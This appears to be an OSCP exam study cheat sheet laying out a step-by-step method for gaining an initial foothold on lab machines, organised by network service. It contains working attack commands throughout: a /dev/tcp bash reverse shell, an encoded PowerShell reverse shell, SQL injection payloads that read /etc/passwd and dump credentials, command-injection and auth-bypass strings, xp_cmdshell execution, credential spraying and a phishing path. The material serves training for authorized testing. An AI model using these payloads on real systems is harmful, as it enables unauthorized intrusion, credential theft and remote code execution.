# Methodology 1 — Getting a Foothold

> Goal: unauthenticated → a shell or valid creds. Work the ports top to bottom, never tunnel-vision one service. Note **everything** (users, versions, paths, creds) — the thing you ignore on port 80 is the privesc on the box next door. Enumerate → act on findings → re-enumerate.

---

## 0. Scan

```bash
# Fast full TCP sweep first, then targeted script/version scan on what's open
nmap -p- --min-rate 5000 -T4 -oA nmap/alltcp $IP
nmap -sC -sV -p<comma,ports> -oA nmap/scripts $IP
sudo nmap -sU --top-ports 100 -oA nmap/udp $IP        # SNMP(161), TFTP(69), SNMP, IKE

# Full TCP connect scan when SYN is filtered / through a pivot
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp $IP
```
While that runs, start manually on any web port. **Don't wait for the full scan to finish to start enumerating.**

**Port → first move cheat:**
| Port | Service | First move |
|---|---|---|
| 21 | FTP | anon login, version → searchsploit |
| 22 | SSH | version (regreSSHion note), key reuse, creds later |
| 25/110/143/587 | SMTP/POP/IMAP | user enum (VRFY/RCPT), hMailServer → searchsploit |
| 53 | DNS | zone transfer, subdomain brute |
| 80/443/8080/8000/5000 | HTTP | whole web section below |
| 88/389/636/445/5985 | **AD** | jump to AD methodology |
| 111/2049 | NFS | `showmount -e`, mount, no_root_squash |
| 135/139/445 | SMB/RPC | enum4linux-ng, shares, null session |
| 161 udp | SNMP | snmpwalk, community strings |
| 1433 | MSSQL | creds, xp_cmdshell |
| 3306 | MySQL | creds, UDF |
| 3389 | RDP | creds, bluekeep (rare), CredSSP |
| 5432 | Postgres | creds, COPY TO PROGRAM |
| 6379 | Redis | unauth, webshell/SSH key write |

---

## 1. Web (80/443/8080/8000/8443/5000…) — the #1 OSCP foothold

```bash
whatweb http://$IP            # tech + versions
curl -sI http://$IP           # headers: X-Powered-By, Server, cookies
# dir/file brute
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
# vhosts / subdomains if a hostname appears (add to /etc/hosts)
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs <size>
```

**Always check manually:** `robots.txt`, `sitemap.xml`, page source / JS files (console funcs, hardcoded creds, API paths), `/.git/`, headers, 404 pages, default creds on any login.

**Things to test, in order:**
- **Identify the app + version → searchsploit / exploitdb immediately.** Most OSCP web footholds are a known CVE on an outdated app.
  ```bash
  searchsploit <app> <version>
  searchsploit -m 50420.py        # mirror it locally
  ```
- **WordPress** → `wpscan --url http://$IP --enumerate p,t,u --plugins-detection aggressive --api-token <TOKEN>`. Outdated plugins (Duplicator LFI CVE-2020-11738, contact-form-7) are classic. Weak admin creds → theme editor → PHP shell.
- **CMS/app with known RCE** (RiteCMS, Cacti, pyLoad, Froxlor, CMS Made Simple, ClearML, RocketChat, SQLPad, Grav) — grab the box-specific exploit and read it before firing.
- **LFI** (`?page=`, `?file=`) → `/etc/passwd`, read source, SSH keys (`/home/<user>/.ssh/id_rsa`, also `id_ecdsa`), log poisoning → RCE, `php://filter` to exfil source.
- **File upload** → bypass with double ext, null byte, content-type, `.phtml`/`.phar`; find upload dir.
- **SQLi** → `sqlmap -r req.txt --batch`; `UNION SELECT` to dump creds; MSSQL stacked → `xp_cmdshell`; MySQL `INTO OUTFILE` webshell / `LOAD_FILE`.
  ```sql
  union select 1,concat(username,0x3a,password),3,4,5,6 from users-- -
  union select 1,load_file('/etc/passwd'),3-- -        # read files
  ```
- **SSTI** (`{{7*7}}`), **command injection** (`;id`, `|id`, `$(id)`, backticks), **XXE**, **deserialization**, **auth bypass** (`admin'--`, JWT `alg:none`/weak secret).
- **API**: enumerate `/api/v1/…` with gobuster `-p pattern`; register a user then self-escalate `"admin":"True"`; POST/PUT to overwrite creds; steal/forge the JWT.
- **Default & guessable creds** on every panel (admin:admin, tomcat:tomcat, etc.).

**Get a shell** once you have RCE:
```bash
# listener
nc -lvnp 443        # or rlwrap nc / pwncat-cs for stability
# payloads — try several
bash -c 'bash -i >& /dev/tcp/$LHOST/443 0>&1'
# windows
powershell -nop -w hidden -e <base64 revshell>   # revshells.com
# upgrade linux tty
python3 -c 'import pty;pty.spawn("/bin/bash")'; # then Ctrl-Z, stty raw -echo; fg
```

---

## 2. SMB / RPC (139/445)

```bash
netexec smb $IP                              # OS, domain, signing
netexec smb $IP -u '' -p '' --shares         # null session
netexec smb $IP -u 'guest' -p '' --shares
enum4linux-ng -A $IP
smbmap -H $IP                                # and with creds: -u x -p y -d domain
smbclient -N -L //$IP/                       # list
smbclient //$IP/<share> -N                   # connect (null)
smbclient //$IP/<share> -U 'dom\user%pass'
```
**Test:** readable shares (Replication/SYSVOL → **GPP cpassword** `gpp-decrypt`), config/xml/`.kdbx`/scripts with creds, write access (drop webshell in webroot share), RID cycling for users, version → EternalBlue (ms17-010) on old boxes.

---

## 3. FTP (21)
```bash
ftp $IP            # anonymous:anonymous
# look for creds, config, webroot (upload shell if ftp maps to http dir)
```
Version → searchsploit. Anonymous write + known web path = shell.

---

## 4. SSH (22)
- Note version (8.9p1 = regreSSHion CVE-2024-6387, but slow/unreliable — note & move on).
- **Always try creds/keys found elsewhere** — reuse is everything in OSCP.
- Private key found → `chmod 600 id_rsa; ssh -i id_rsa user@$IP`. Passphrase? → `ssh2john id_rsa > hash; john --wordlist=rockyou.txt hash`.

---

## 5. SNMP (161/udp)
```bash
sudo nmap -sU -p161 --open $IP
snmpwalk -v2c -c public $IP
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
# Windows OIDs worth pulling:
snmpwalk -v1 -c public $IP 1.3.6.1.4.1.77.1.2.25      # user accounts
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.25.4.2.1.2     # running programs
snmpwalk -v1 -c public $IP 1.3.6.1.2.1.25.6.3.1.2     # installed software
```
Community strings often leak processes with **passwords on the command line**.

---

## 6. DNS (53)
```bash
dig axfr @$IP $DOMAIN            # zone transfer
dnsenum $DOMAIN ; dnsrecon -d $DOMAIN -t std
for s in $(cat subdomains.txt); do host $s.$DOMAIN; done | grep -v NXDOMAIN
```

---

## 7. Databases (1433 MSSQL / 3306 MySQL / 5432 Postgres / 6379 Redis)
```bash
# MSSQL (impacket)
impacket-mssqlclient dom/user:pass@$IP -windows-auth
# in session:
enable_xp_cmdshell ; xp_cmdshell whoami
# MySQL
mysql -h $IP -u root -p
# Redis unauth → write SSH key or webshell
redis-cli -h $IP
```

---

## 8. Mail (25/110/143/587)
- SMTP user enum: `smtp-user-enum -M VRFY -U users.txt -t $IP`.
- hMailServer / known mail software → searchsploit.
- Phishing path (challenge labs): send macro/HTA/`.lnk` to a user → revshell (swaks to deliver).

---

## Foothold decision flow
1. Full scan running → hit web manually.
2. For each open port: **version → searchsploit** + default creds + null/anon access.
3. Web: fingerprint → dirbust → known CVE / LFI / upload / SQLi / injection.
4. Any creds or key found → **spray everywhere** (SSH, SMB, RDP, WinRM, the app).
5. Got RCE → stable reverse shell → move to the relevant privesc methodology.
6. **Stuck 20 min?** Re-read the full nmap + web source. The foothold is almost always a version you already saw.

**Creds hygiene:** keep a running `creds.txt` (user:pass:where) and `users.txt`. Reuse across services and hosts is the single most common OSCP win.
